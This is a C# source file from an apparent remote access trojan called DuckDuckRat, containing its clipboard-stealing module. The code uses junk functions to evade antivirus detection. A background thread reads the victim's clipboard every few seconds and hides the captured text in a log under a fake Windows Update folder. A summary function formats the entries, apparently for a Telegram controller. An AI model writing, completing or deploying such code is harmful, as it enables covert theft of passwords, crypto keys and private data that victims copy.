using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.IO;

namespace DuckDuckRat.Modules
{
    public static class ClipboardModule
    {
        // [POLY_JUNK]
        private static void _DuckDuckRat_f43b10c0() {
            int val = 51359;
            if (val > 50000) Console.WriteLine("Hash:" + 51359);
        }

        [DllImport("user32.dll")] static extern bool OpenClipboard(IntPtr hWnd);
        [DllImport("user32.dll")] static extern bool CloseClipboard();
        [DllImport("user32.dll")] static extern IntPtr GetClipboardData(uint uFormat);
        [DllImport("kernel32.dll")] static extern IntPtr GlobalLock(IntPtr hMem);
        [DllImport("kernel32.dll")] static extern bool GlobalUnlock(IntPtr hMem);

        private const uint CF_UNICODETEXT = 13;
        private static string _lastText = "";
        private static bool _started = false; // Prevent thread leakage
        private static readonly object _lock = new object();
        
        private static string GetLogPath() 
        {
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "clip_history.txt");
            string? dir = Path.GetDirectoryName(path);
            if (dir != null && !Directory.Exists(dir)) Directory.CreateDirectory(dir);
            return path;
        }

        public static void Start()
        {
            lock (_lock)
            {
                if (_started) return;
                _started = true;
            }

            new Thread(() =>
            {
                while (true)
                {
                    try
                    {
                        string currentText = GetClipboardText();
                        if (!string.IsNullOrWhiteSpace(currentText) && currentText != _lastText)
                        {
                            _lastText = currentText;
                            lock (_lock)
                            {
                                string logEntry = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] 📋 {currentText}\n" + new string('-', 20) + "\n";
                                File.AppendAllText(GetLogPath(), logEntry);
                            }
                        }
                    }
                    catch { }
                    Thread.Sleep(3000);
                }
            }) { IsBackground = true }.Start();
        }

        public static string GetSummary()
        {
            try 
            {
                string path = GetLogPath();
                if (!File.Exists(path)) return "📋 <i>Clipboard history is empty.</i>";
                
                var lines = File.ReadAllLines(path);
                // Return last 10 entries for TG preview
                var lastLines = lines.Length > 20 ? lines[^20..] : lines;
                return string.Join("\n", lastLines);
            }
            catch { return "❌ Error reading clipboard history."; }
        }

        public static string GetHistoryFilePath() => GetLogPath();

        public static string GetClipboardText()
        {
            try
            {
                string result = "";
                var t = new Thread(() =>
                {
                    try
                    {
                        if (!OpenClipboard(IntPtr.Zero)) return;
                        IntPtr handle = GetClipboardData(CF_UNICODETEXT);
                        if (handle == IntPtr.Zero) { CloseClipboard(); return; }
                        IntPtr ptr = GlobalLock(handle);
                        if (ptr != IntPtr.Zero)
                        {
                            result = Marshal.PtrToStringUni(ptr) ?? "";
                            GlobalUnlock(handle);
                        }
                        CloseClipboard();
                    }
                    catch { }
                });
                t.SetApartmentState(ApartmentState.STA);
                t.Start();
                t.Join(1000);
                return result;
            }
            catch { return ""; }
        }
    }
}


